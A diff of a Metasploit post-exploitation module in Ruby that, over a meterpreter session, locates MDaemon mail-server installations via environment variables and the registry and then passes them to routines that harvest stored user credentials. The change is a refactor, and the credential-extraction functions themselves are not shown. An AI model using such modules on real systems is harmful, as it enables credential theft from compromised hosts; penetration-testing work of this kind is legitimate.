@@ -31,30 +31,27 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-      if session.type != 'meterpreter'
-        print_error ('Only meterpreter sessions are supported by this post module')
-        return
+    if session.type != 'meterpreter'
+      print_error ('Only meterpreter sessions are supported by this post module')
+      return
+    end
+    progfiles_env = session.sys.config.getenvs('SYSTEMDRIVE', 'HOMEDRIVE', 'ProgramFiles', 'ProgramFiles(x86)', 'ProgramW6432')
+    locations = ['C:\MDaemon\App']
+    progfiles_env.each do |_k, v|
+      vprint_status("Searching MDaemon installation at #{v}")
+      if session.fs.dir.entries(name = v).include? 'MDaemon'
+        vprint_status("Found MDaemon installation at #{v}")
+        locations << v + '\\MDaemon\\'
       end
-      progfiles_env = session.sys.config.getenvs('SYSTEMDRIVE', 'HOMEDRIVE', 'ProgramFiles', 'ProgramFiles(x86)', 'ProgramW6432')
-      locations = []
-      progfiles_env.each do |_k, v|
-        vprint_status("Searching MDaemon installation at #{v}")
-        if session.fs.dir.entries(name = v).include? 'MDaemon'
-          vprint_status("Found MDaemon installation at #{v}")
-          locations << v + '\\MDaemon\\'
-        end
-        next
-      end
+    end
 
     keys = [
       'HKLM\\SOFTWARE\\Alt-N Technologies\\MDaemon', # 64 bit. Has AppPath
       # "HKLM\\SOFTWARE\\Wise Solutions\\WiseUpdate\\Apps\\MDaemon Server" # 32 bit on 64-bit system. Won't find path on register
     ]
-
-    locations = ['C:\MDaemon\App']
-
-    if datastore['RHOST'].nil?
-      locations << datastore['RHOST']
+    
+    if datastore['RPATH'].nil?
+      locations << datastore['RPATH']
     end
 
     keys.each do |key|
@@ -67,7 +64,7 @@ class MetasploitModule < Msf::Post
       end
       locations << value.data + '\\'
     end
-    locations = locations.uniq
+    locations.uniq!
     locations = locations.compact
     userlist = check_mdaemons(locations)
     get_mdaemon_creds(userlist) if userlist
